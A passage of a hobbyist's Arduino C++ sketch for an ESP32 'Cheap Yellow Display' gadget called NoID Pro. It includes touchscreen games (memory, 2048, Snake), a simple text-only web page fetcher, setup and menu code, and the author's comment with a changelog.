        screen.pushSprite(0, 0);
        delay(1000);
        
        for (int i = 0; i < level; i++) {
          screen.fillScreen(TFT_BLACK);
          status_bar("Memorize");
          screen.drawRect(11, 41, 220, 220, TFT_WHITE);
          for (int l = 0; l < size; l++) {
            screen.drawLine(10 + grd * l, 40, 10 + grd * l, 260, TFT_WHITE);
            screen.drawLine(10, 40 + grd * l, 230, 40 + grd * l, TFT_WHITE);
          }
          int col = sequenceX[i];
          int row = sequenceY[i];
          int x = 10 + col * grd;
          int y = 40 + row * grd;
          screen.fillRect(x, y, grd, grd, TFT_YELLOW);
          screen.pushSprite(0, 0);
          delay(500);
          screen.fillRect(x, y, grd, grd, TFT_BLACK);
          screen.drawRect(x, y, grd, grd, TFT_WHITE);
          screen.pushSprite(0, 0);
          delay(250);
        }
        
        int attempt = 0;
        while (attempt < level && playing) {
          screen.fillScreen(TFT_BLACK);
          status_bar("Your turn");
          screen.drawRect(11, 41, 220, 220, TFT_WHITE);
          for (int l = 0; l < size; l++) {
            screen.drawLine(10 + grd * l, 40, 10 + grd * l, 260, TFT_WHITE);
            screen.drawLine(10, 40 + grd * l, 230, 40 + grd * l, TFT_WHITE);
          }
          screen.pushSprite(0, 0);
          
          bool touched = false;
          int selectedCol = -1, selectedRow = -1;
          while (!touched) {
            if (touchscreen.touched()) {
              TS_Point p = touchscreen.getPoint();
              int px = map(p.x, MIN_TOUCH_X, MAX_TOUCH_X, 1, SCREEN_WIDTH);
              int py = map(p.y, MIN_TOUCH_Y, MAX_TOUCH_Y, 1, SCREEN_HEIGHT);
              if (px >= 10 && px < 230 && py >= 40 && py < 260) {
                selectedCol = (px - 10) / grd;
                selectedRow = (py - 40) / grd;
                touched = true;
                delay(200);
              }
            }
          }
          
          if (selectedCol == sequenceX[attempt] && selectedRow == sequenceY[attempt]) {
            int x = 10 + selectedCol * grd;
            int y = 40 + selectedRow * grd;
            screen.fillRect(x, y, grd, grd, TFT_GREEN);
            screen.pushSprite(0, 0);
            delay(300);
            attempt++;
          } else {
            int x = 10 + selectedCol * grd;
            int y = 40 + selectedRow * grd;
            screen.fillRect(x, y, grd, grd, TFT_RED);
            screen.pushSprite(0, 0);
            delay(1000);
            playing = false;
          }
        }
        
        if (playing) {
          level++;
          delay(500);
        }
      }
      
      screen.fillScreen(TFT_BLACK);
      status_bar("Game Over");
      screen.drawCentreString("Game Over", 120, 80, 4);
      screen.drawCentreString("Score: " + String(level - 1), 120, 110, 2.9);
      screen.pushSprite(0, 0);
      delay(2000);
    }
    
    if (button("Exit", 40, 260, 20, TFT_WHITE, 2.9)) {
      screen.setTextColor(TFT_WHITE);
      return;
    }
    screen.pushSprite(0, 0);
  }
}

#define BOARD_SIZE 4
int board[BOARD_SIZE][BOARD_SIZE];

const int boardX = 10;
const int boardY = 60;
const int boardW = 220;
const int boardH = 220;
const int cellSize = boardW / BOARD_SIZE;

void spawnTile() {
  int empties[BOARD_SIZE * BOARD_SIZE][2];
  int count = 0;
  for (int i = 0; i < BOARD_SIZE; i++) {
    for (int j = 0; j < BOARD_SIZE; j++) {
      if (board[i][j] == 0) {
        empties[count][0] = i;
        empties[count][1] = j;
        count++;
      }
    }
  }
  if (count > 0) {
    int idx = random(0, count);
    int newVal = (random(0, 10) < 9) ? 2 : 4;
    board[empties[idx][0]][empties[idx][1]] = newVal;
  }
}

void getTileColors(int value, uint16_t &bg, uint16_t &text) {
  if (value == 0) {
    bg = TFT_WHITE;
    text = TFT_BLACK;
  }
  else if (value == 2) {
    bg = TFT_GREEN;
    text = TFT_BLACK;
  }
  else if (value == 4) {
    bg = TFT_DARKGREEN;
    text = TFT_BLACK;
  }
  else if (value == 8) {
    bg = TFT_ORANGE;
    text = TFT_WHITE;
  }
  else if (value == 16) {
    bg = TFT_RED;
    text = TFT_WHITE;
  }
  else if (value == 32) {
    bg = TFT_MAGENTA;
    text = TFT_WHITE;
  }
  else if (value == 64) {
    bg = TFT_PURPLE;
    text = TFT_WHITE;
  }
  else if (value == 128) {
    bg = TFT_BLUE;
    text = TFT_WHITE;
  }
  else if (value == 256) {
    bg = TFT_CYAN;
    text = TFT_BLACK;
  }
  else if (value == 512) {
    bg = TFT_YELLOW;
    text = TFT_BLACK;
  }
  else if (value == 1024) {
    bg = TFT_DARKGREY;
    text = TFT_WHITE;
  }
  else if (value == 2048) {
    bg = TFT_SILVER; 
    text = TFT_WHITE;
  }
  else {
    bg = TFT_BLACK;
    text = TFT_WHITE;
  }
}

void initBoard() {
  for (int i = 0; i < BOARD_SIZE; i++) {
    for (int j = 0; j < BOARD_SIZE; j++) {
      board[i][j] = 0;
    }
  }
  spawnTile();
  spawnTile();
}

void drawBoard() {
  screen.fillRect(boardX, boardY, boardW, boardH, TFT_WHITE);
  
  for (int i = 1; i < BOARD_SIZE; i++) {
    screen.drawLine(boardX + i * cellSize, boardY, boardX + i * cellSize, boardY + boardH, TFT_BLACK);
    screen.drawLine(boardX, boardY + i * cellSize, boardX + boardW, boardY + i * cellSize, TFT_BLACK);
  }
  
  for (int i = 0; i < BOARD_SIZE; i++) {
    for (int j = 0; j < BOARD_SIZE; j++) {
      int value = board[i][j];
      uint16_t bg, text;
      getTileColors(value, bg, text);
      int cellX = boardX + j * cellSize;
      int cellY = boardY + i * cellSize;
      screen.fillRect(cellX + 2, cellY + 2, cellSize - 4, cellSize - 4, bg);
      if (value != 0) {
        String s = String(value);
        screen.setTextColor(text, bg);
        screen.drawCentreString(s, cellX + cellSize/2, cellY + cellSize/2 - 8, 2.5);
      }
    }
  }
}

bool moveLeft() {
  bool moved = false;
  for (int i = 0; i < BOARD_SIZE; i++) {
    int temp[BOARD_SIZE] = {0};
    int pos = 0;
    for (int j = 0; j < BOARD_SIZE; j++) {
      if (board[i][j] != 0)
        temp[pos++] = board[i][j];
    }
    for (int j = 0; j < pos - 1; j++) {
      if (temp[j] == temp[j+1]) {
        temp[j] *= 2;
        temp[j+1] = 0;
        moved = true;
      }
    }
    int newRow[BOARD_SIZE] = {0};
    int newPos = 0;
    for (int j = 0; j < BOARD_SIZE; j++) {
      if (temp[j] != 0)
        newRow[newPos++] = temp[j];
    }
    for (int j = 0; j < BOARD_SIZE; j++) {
      if (board[i][j] != newRow[j]) {
        board[i][j] = newRow[j];
        moved = true;
      }
    }
  }
  return moved;
}

bool moveRight() {
  bool moved = false;
  for (int i = 0; i < BOARD_SIZE; i++) {
    int temp[BOARD_SIZE] = {0};
    int pos = 0;
    for (int j = BOARD_SIZE - 1; j >= 0; j--) {
      if (board[i][j] != 0)
        temp[pos++] = board[i][j];
    }
    for (int j = 0; j < pos - 1; j++) {
      if (temp[j] == temp[j+1]) {
        temp[j] *= 2;
        temp[j+1] = 0;
        moved = true;
      }
    }
    int newRow[BOARD_SIZE] = {0};
    int newPos = 0;
    for (int j = 0; j < pos; j++) {
      if (temp[j] != 0)
        newRow[newPos++] = temp[j];
    }
    for (int j = BOARD_SIZE - 1, k = 0; j >= 0; j--, k++) {
      if (board[i][j] != newRow[k]) {
        board[i][j] = newRow[k];
        moved = true;
      }
    }
  }
  return moved;
}

bool moveUp() {
  bool moved = false;
  for (int j = 0; j < BOARD_SIZE; j++) {
    int temp[BOARD_SIZE] = {0};
    int pos = 0;
    for (int i = 0; i < BOARD_SIZE; i++) {
      if (board[i][j] != 0)
        temp[pos++] = board[i][j];
    }
    for (int i = 0; i < pos - 1; i++) {
      if (temp[i] == temp[i+1]) {
        temp[i] *= 2;
        temp[i+1] = 0;
        moved = true;
      }
    }
    int newCol[BOARD_SIZE] = {0};
    int newPos = 0;
    for (int i = 0; i < BOARD_SIZE; i++) {
      if (temp[i] != 0)
        newCol[newPos++] = temp[i];
    }
    for (int i = 0; i < BOARD_SIZE; i++) {
      if (board[i][j] != newCol[i]) {
        board[i][j] = newCol[i];
        moved = true;
      }
    }
  }
  return moved;
}

bool moveDown() {
  bool moved = false;
  for (int j = 0; j < BOARD_SIZE; j++) {
    int temp[BOARD_SIZE] = {0};
    int pos = 0;
    for (int i = BOARD_SIZE - 1; i >= 0; i--) {
      if (board[i][j] != 0)
        temp[pos++] = board[i][j];
    }
    for (int i = 0; i < pos - 1; i++) {
      if (temp[i] == temp[i+1]) {
        temp[i] *= 2;
        temp[i+1] = 0;
        moved = true;
      }
    }
    int newCol[BOARD_SIZE] = {0};
    int newPos = 0;
    for (int i = 0; i < pos; i++) {
      if (temp[i] != 0)
        newCol[newPos++] = temp[i];
    }
    for (int i = BOARD_SIZE - 1, k = 0; i >= 0; i--, k++) {
      if (board[i][j] != newCol[k]) {
        board[i][j] = newCol[k];
        moved = true;
      }
    }
  }
  return moved;
}

bool checkGameOver() {
  for (int i = 0; i < BOARD_SIZE; i++) {
    for (int j = 0; j < BOARD_SIZE; j++) {
      if (board[i][j] == 0)
        return false;
      if (j < BOARD_SIZE - 1 && board[i][j] == board[i][j+1])
        return false;
      if (i < BOARD_SIZE - 1 && board[i][j] == board[i+1][j])
        return false;
    }
  }
  return true;
}

void displayGameOver() {
  screen.fillScreen(TFT_ORANGE);
  screen.setTextColor(TFT_BLACK, TFT_ORANGE);
  screen.drawCentreString("Game Over!", 120, 150, 4);
  screen.pushSprite(0, 0);
  delay(2000);
}

int detectSwipe() {
  static bool swiping = false;
  static int startX, startY;
  static int lastX, lastY;
  if (touchscreen.touched()) {
    TS_Point p = touchscreen.getPoint();
    int x = map(p.x, MIN_TOUCH_X, MAX_TOUCH_X, 1, SCREEN_WIDTH);
    int y = map(p.y, MIN_TOUCH_Y, MAX_TOUCH_Y, 1, SCREEN_HEIGHT);
    if (!swiping) {
      swiping = true;
      startX = x;
      startY = y;
    }
    lastX = x;
    lastY = y;
  }
  else {
    if (swiping) {
      swiping = false;
      int dx = lastX - startX;
      int dy = lastY - startY;
      int threshold = 10;
      if (abs(dx) > abs(dy) && abs(dx) > threshold) {
        return (dx > 0) ? 1 : 0;
      }
      else if (abs(dy) > threshold) {
        return (dy > 0) ? 3 : 2;
      }
    }
  }
  return -1;
}

void game2048() {
  initBoard();
  
  while (true) {
    screen.fillScreen(TFT_ORANGE);
    
    screen.setTextColor(TFT_WHITE, TFT_ORANGE);
    screen.drawString("2048", 10, 10, 6);
    
    if (button("Exit", 20, 288, 20, TFT_WHITE, 2.9)) {
      screen.setTextColor(TFT_WHITE, TFT_BLACK);
      return; 
    }
    if (button("Clear", 200, 288, 20, TFT_WHITE, 2.9)) {
      initBoard();
    }
    
    drawBoard();
    screen.pushSprite(0, 0);
    
    int swipeDir = detectSwipe();
    if (swipeDir != -1) {
      bool moved = false;
      switch (swipeDir) {
        case 0: moved = moveLeft(); break;
        case 1: moved = moveRight(); break;
        case 2: moved = moveUp(); break;
        case 3: moved = moveDown(); break;
      }
      if (moved) {
        spawnTile();
      }
      if (checkGameOver()) {
        delay(1000);
        displayGameOver();
        initBoard();
      }
    }
    delay(50);
  }
}

#define DIR_LEFT  0
#define DIR_RIGHT 1
#define DIR_UP    2
#define DIR_DOWN  3

struct Point {
  int x;
  int y;
};

void gameSnake() {
  const int SNAKE_COLS = 20;
  const int SNAKE_ROWS = 20;
  const int CELL_SIZE = 10;

  int boardX = (240 - SNAKE_COLS * CELL_SIZE) / 2; 
  int boardY = (320 - SNAKE_ROWS * CELL_SIZE) / 2;

  static int highScore = 0;

  while (true) {
    int score = 0;
    int snakeLength = 3;
    Point snake[400];

    int startX = SNAKE_COLS / 2;
    int startY = SNAKE_ROWS / 2;
    snake[0] = { startX, startY };
    snake[1] = { startX - 1, startY };
    snake[2] = { startX - 2, startY };

    int dir = DIR_RIGHT; 

    Point food;
    auto spawnFood = [&]() {
      while (true) {
        int fx = random(1, SNAKE_COLS - 1);
        int fy = random(1, SNAKE_ROWS - 1);
        bool collides = false;
        for (int i = 0; i < snakeLength; i++) {
          if (snake[i].x == fx && snake[i].y == fy) { collides = true; break; }
        }
        if (!collides) {
          food.x = fx;
          food.y = fy;
          break;
        }
      }
    };
    spawnFood();

    bool gameOverFlag = false;

    while (!gameOverFlag) {
      if (touchscreen.touched()) {
        TS_Point p = touchscreen.getPoint();
        int tx = map(p.x, MIN_TOUCH_X, MAX_TOUCH_X, 1, SCREEN_WIDTH);
        int ty = map(p.y, MIN_TOUCH_Y, MAX_TOUCH_Y, 1, SCREEN_HEIGHT);
        if (tx >= boardX && tx < boardX + SNAKE_COLS * CELL_SIZE &&
            ty >= boardY && ty < boardY + SNAKE_ROWS * CELL_SIZE) {
          int centerX = boardX + (SNAKE_COLS * CELL_SIZE) / 2;
          int centerY = boardY + (SNAKE_ROWS * CELL_SIZE) / 2;
          int dx = tx - centerX;
          int dy = ty - centerY;
          if (dy < -abs(dx) && dir != DIR_DOWN) {
            dir = DIR_UP;
          } else if (dy > abs(dx) && dir != DIR_UP) { 
            dir = DIR_DOWN;
          } else if (dx < -abs(dy) && dir != DIR_RIGHT) {  
            dir = DIR_LEFT;
          } else if (dx > abs(dy) && dir != DIR_LEFT) {    
            dir = DIR_RIGHT;
          }
        }
      }

      Point newHead = snake[0];
      if (dir == DIR_LEFT)      newHead.x--;
      else if (dir == DIR_RIGHT) newHead.x++;
      else if (dir == DIR_UP)    newHead.y--;
      else if (dir == DIR_DOWN)  newHead.y++;

      if (newHead.x <= 0 || newHead.x >= SNAKE_COLS - 1 ||
          newHead.y <= 0 || newHead.y >= SNAKE_ROWS - 1) {
        gameOverFlag = true;
        break;
      }
      for (int i = 0; i < snakeLength; i++) {
        if (snake[i].x == newHead.x && snake[i].y == newHead.y) {
          gameOverFlag = true;
          break;
        }
      }
      if (gameOverFlag) break;

      for (int i = snakeLength; i > 0; i--) {
        snake[i] = snake[i - 1];
      }
      snake[0] = newHead;

      if (newHead.x == food.x && newHead.y == food.y) {
        snakeLength++;
        score++;
        if (score > highScore) highScore = score;
        spawnFood();
      }

      screen.fillScreen(TFT_BLACK);

      screen.setTextColor(TFT_WHITE, TFT_BLACK);
      screen.drawString("Score: " + String(score), 5, 5, 2.5);
      screen.drawString("High: "  + String(highScore), 5, 20, 2.5);

      for (int i = 0; i < SNAKE_COLS; i++) {
        int x = boardX + i * CELL_SIZE;
        int yTop = boardY;
        int yBottom = boardY + (SNAKE_ROWS - 1) * CELL_SIZE;
        screen.fillRect(x, yTop, CELL_SIZE, CELL_SIZE, TFT_LIGHTGREY);
        screen.fillRect(x, yBottom, CELL_SIZE, CELL_SIZE, TFT_LIGHTGREY);
      }
      for (int j = 0; j < SNAKE_ROWS; j++) {
        int y = boardY + j * CELL_SIZE;
        int xLeft = boardX;
        int xRight = boardX + (SNAKE_COLS - 1) * CELL_SIZE;
        screen.fillRect(xLeft, y, CELL_SIZE, CELL_SIZE, TFT_LIGHTGREY);
        screen.fillRect(xRight, y, CELL_SIZE, CELL_SIZE, TFT_LIGHTGREY);
      }

      for (int i = 0; i < snakeLength; i++) {
        int x = boardX + snake[i].x * CELL_SIZE;
        int y = boardY + snake[i].y * CELL_SIZE;
        screen.fillRect(x, y, CELL_SIZE, CELL_SIZE, TFT_WHITE);
      }

      int fx = boardX + food.x * CELL_SIZE;
      int fy = boardY + food.y * CELL_SIZE;
      screen.fillRect(fx, fy, CELL_SIZE, CELL_SIZE, TFT_RED);

      screen.pushSprite(0, 0);
      delay(400); 
    } 

    while (true) {
      screen.fillScreen(TFT_BLACK);
      screen.setTextColor(TFT_WHITE, TFT_BLACK);
      screen.drawCentreString("Game Over", 120, 80, 4);
      screen.drawCentreString("Score: " + String(score), 120, 120, 3);
      screen.drawCentreString("High: "  + String(highScore), 120, 150, 3);
      if (button("Play again", 20, 200, 60, TFT_WHITE, 2.8)) {
        break;  
      }
      if (button("Exit", 160, 200, 60, TFT_WHITE, 2.8)) {
        return; 
      }
      screen.pushSprite(0, 0);
      delay(50);
    }
  } 
}

String extractText(String html) {
  String text = "";
  bool inTag = false;

  for (int i = 0; i < html.length(); i++) {
    char c = html[i];

    if (c == '<') inTag = true; 
    else if (c == '>') inTag = false;
    else if (!inTag) text += c; 
  }

  text.replace("&nbsp;", " ");
  text.replace("&amp;", "&");
  
  return text;
}

void fetchWebPage(const char* url) {
  HTTPClient http;
  Serial.println("[DEBUG] Bắt đầu fetch trang web...");
  
  http.begin(url);
  http.setUserAgent("Mozilla/5.0 (Nokia3310; U; Mobile)");
  
  Serial.println("[DEBUG] Gửi yêu cầu GET...");
  int httpCode = http.GET();
  Serial.printf("[DEBUG] Mã phản hồi HTTP: %d\n", httpCode);
  
  if (httpCode > 0) {
    WiFiClient* stream = http.getStreamPtr();
    Serial.println("[DEBUG] Nhận nội dung trang web:");

    String payload = "";
    char buffer[128]; 
    while (stream->available()) {
      int len = stream->readBytes(buffer, sizeof(buffer) - 1);
      buffer[len] = '\0';
      payload += buffer;

      if (payload.length() > 2048) break;
    }

    String cleanText = extractText(payload);
    Serial.println(cleanText.substring(0, 1024));

    int start = 0;
    while (start < cleanText.length()) {
      String line = cleanText.substring(start, start + 32);
      terminalPrint(line);
      start += 32;
    }
  } else {
    Serial.println("[DEBUG] Failed to fetch page");
  }

  http.end();
}

void webBrowser() {
  tft.fillScreen(TFT_BLACK);
  clearTerminal();
  terminalPrint("Fetching http://www.google.com");
  fetchWebPage("http://www.example.com");
  terminalPrint("Done!");
  while (digitalRead(0) == HIGH) delay(100);
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_MODE_STA);
  WiFi.begin();
  touchscreenSPI.begin(XPT2046_CLK, XPT2046_MISO, XPT2046_MOSI, XPT2046_CS);
  touchscreen.begin(touchscreenSPI);
  touchscreen.setRotation(SCREEN_ROTATION);
  tft.init();
  tft.setRotation(SCREEN_ROTATION);
  tft.fillScreen(TFT_BLACK);
  
  ledcSetup(CH_R, 5000, 8);
  ledcSetup(CH_G, 5000, 8);
  ledcSetup(CH_B, 5000, 8);
  ledcSetup(CH_D, 5000, 8);
  ledcAttachPin(LIGR, CH_R);
  ledcAttachPin(LIGG, CH_G);
  ledcAttachPin(LIGB, CH_B);
  ledcAttachPin(BLIG, CH_D);
  ledColor(0, 0, 0);
  backlight(bl);
  analogSetPinAttenuation(34, ADC_0db);
  esp_sleep_enable_ext0_wakeup(GPIO_NUM_0, 0);
  
  screen.setColorDepth(8);
  screen.createSprite(SCREEN_WIDTH, SCREEN_HEIGHT);
  screen.fillScreen(TFT_BLACK);
  screen.setTextColor(TFT_WHITE);
  int cx = SCREEN_WIDTH / 2;
  int cy = SCREEN_HEIGHT / 2;
  screen.drawBitmap(cx - 64, cy - 64, noidLogo, 128, 128, TFT_WHITE, TFT_BLACK);
  screen.drawCentreString("NoID Pro", cx, cy + 80, 4);
  screen.pushSprite(0, 0);
  
  delay(1000);

}

void loop() {
  int app_selected =  mainMenu();
  switch (app_selected) {
    case 0: appWifi();      break;
    case 1: appHotspot();   break;
    case 2: appClock();     break;
    case 3: {
      int gtp = gameMenu();
      switch (gtp) {
        case 0: gameFlappy(); break;
        case 2: game2048();   break;
        case 3: gameSnake();  break;
        case 4: gameMem();    break;
        default: break;
      }
      break;
     }
    case 4: fileExplorer(); break;
    case 5:{
      int lnc = miscMenu();
      switch (lnc) {
        case 0: keyboard();   break;
        case 1: miscRGB();    break;
        case 2: miscPain();   break;
        case 3: miscCalc();   break;
        case 4: miscLDR();    break;
        case 5: tonePad();    break;
        case 6: miscTouch();  break;
        case 7: webBrowser(); break;
        default: break;
      }
      break;
    }
    default: break;
  }
}

/*
            ▗▖  ▗▖ ▗▄▖ ▗▄▄▄▖▗▄▄▄ 
            ▐▛▚▖▐▌▐▌ ▐▌  █  ▐▌  █
            ▐▌ ▝▜▌▐▌ ▐▌  █  ▐▌  █
            ▐▌  ▐▌▝▚▄▞▘▗▄█▄▖▐▙▄▄▀      
               We Have No Ideal
So, dear developers
I'm Khang238, a computer science student
I'm not good at coding, but I'm trying to learn
NoID is a bigest project I've ever done
this is hard, from understand WHAT device i'm working on
to HOW to make it work (but it doesn't work most of the time)
after all, I'm proud of what I've done
now NoID can prove that: it not just a small project
i've seen some guy make marauder on Esp32, it's cool
but NoID is not for hacking
maybe a litter bit for hacking
but it's for everyone, for every day
do some small task like check the time, playing simple game, have some fun
i'm now have done almost everything I want on NoID
and now this might be the last update
i'm sad to say, but it's true
when you see this message, you know
i will upload this project to github
and hope someone will continue this project
maybe
if you - a professional developer - see this
please, help me to make this project better
bring NoID to the top of the world
make it become a powerful device
and not just for some litte stupid thing
                                - Khang238 -

------ NoID Pro 4.7.02 ------
Creator: Khang238
Date: 04 - 04 - 2025

==== Changes ====
* Added ability to upload files from phone / PC to Esp32 via WebServer (i want to make this for a long time but i'm too lazy)
* Changed the default value of "Picture Color Boost" to 2.4 (because why not)
* Added "Touch Test" and "Web Browser" (Web Browser is not working yet so don't touch it)
* Changed the way you interact with "Files":
  - So, first, remove the "Reload Path" and "Add Path" (it sucks)
  - Replace them with "Return" and "Open" only (because why not)
  - Add new "Remove" button (it will be change to "Option" in the next update so you can do more than just remove)
  - "Remove" button still have bug (like remove "n o t h i n g" when you open the emty folder), so don't touuch it (or simply just avoid using it in the wrong way)

Thank For:
- Khang238 (me, because why not)
- ChatGPT (seriously)
- Copilot (thank so much for suggest me some stupid compilation)
- Espessif (for Esp32, they are not sponsoring me but highly recommend)
- Arduino (because they use C++, efficient and not painful like python)
(if you are another code and have some change to this, feel free to add your name here)

NoID Program
Device: - ESP32-2432S028R (a.k.a Cheap Yellow Display)
        - Or any ESP32 board, if you know what you are doing
*/